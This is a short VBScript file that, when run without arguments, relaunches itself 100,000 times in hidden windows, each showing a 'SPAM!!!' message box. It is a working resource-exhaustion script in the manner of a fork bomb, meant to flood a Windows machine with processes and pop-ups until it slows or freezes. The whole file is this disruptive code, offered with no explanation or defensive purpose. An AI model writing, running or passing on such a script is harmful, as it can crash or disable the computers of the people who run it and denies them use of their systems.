Set shell = CreateObject("WScript.Shell")

If WScript.Arguments.Count = 0 Then
    For i = 1 To 100000
        shell.Run "wscript.exe """ & WScript.ScriptFullName & """ child", 0
    Next
    MsgBox "SPAM!!!", 64, "Starter"
Else
    MsgBox "SPAM!!!", 64, "MsgBox"
End If
